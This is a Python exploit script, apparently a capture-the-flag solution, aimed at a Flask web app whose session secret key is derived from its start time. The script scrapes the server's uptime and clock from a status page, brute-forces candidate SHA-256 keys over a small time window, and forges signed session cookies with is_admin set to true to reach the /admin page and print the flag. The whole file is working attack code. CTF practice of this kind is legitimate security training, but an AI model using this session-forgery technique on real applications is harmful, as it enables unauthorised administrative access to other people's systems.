#!/usr/bin/env python3
import requests
from datetime import datetime, timedelta
import hashlib
from itsdangerous import URLSafeTimedSerializer
import re

def generate_session_cookie(secret_key, session_data):
    """Generates a session cookie given a secret key and session data."""
    serializer = URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        serializer=None,
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
    )
    return serializer.dumps(session_data)

def get_flag(server_url):
    # Fetch /status
    status_url = f'{server_url}/status'
    r = requests.get(status_url)
    status_content = r.text

    # Parse server time and uptime using regular expressions
    uptime_match = re.search(r'Server uptime:\s*(.*?)<br>', status_content)
    server_time_match = re.search(r'Server time:\s*(.*?)$', status_content, re.MULTILINE)

    if not uptime_match or not server_time_match:
        print("Failed to parse server status page.")
        return

    uptime_str = uptime_match.group(1).strip()
    server_time_str = server_time_match.group(1).strip()

    # Parse uptime into timedelta
    uptime_parts = uptime_str.split(':')
    hours = int(uptime_parts[0])
    minutes = int(uptime_parts[1])
    seconds = int(uptime_parts[2])
    uptime = timedelta(hours=hours, minutes=minutes, seconds=seconds)

    # Parse server time into datetime
    server_time = datetime.strptime(server_time_str, '%Y-%m-%d %H:%M:%S')

    # Compute server start time
    server_start_time = server_time - uptime

    for delta_seconds in range(-15, 16):
        possible_start_time = server_start_time + timedelta(seconds=delta_seconds)
        server_start_str = possible_start_time.strftime('%Y%m%d%H%M%S')
        secure_key_input = f'secret_key_{server_start_str}'
        secure_key = hashlib.sha256(secure_key_input.encode()).hexdigest()

        session_data = {'is_admin': True, 'username': 'administrator'}
        try:
            session_cookie = generate_session_cookie(secure_key, session_data)
        except Exception as e:
            print(f'Error generating session cookie with secret key {secure_key}: {e}')
            continue

        cookies = {'session': session_cookie}
        admin_url = f'{server_url}/admin'
        resp = requests.get(admin_url, cookies=cookies)

        if resp.status_code == 200:
            print('Flag:', resp.text)
            return
        else:
            print(f'Tried secret_key {secure_key_input}, status code {resp.status_code}')

    print('Failed to retrieve the flag. Re-run please, sometime my script is not working properly xD')

if __name__ == '__main__':
    server_url = 'http://chal.competitivecyber.club:9999'  # Replace with the actual server URL
    get_flag(server_url)
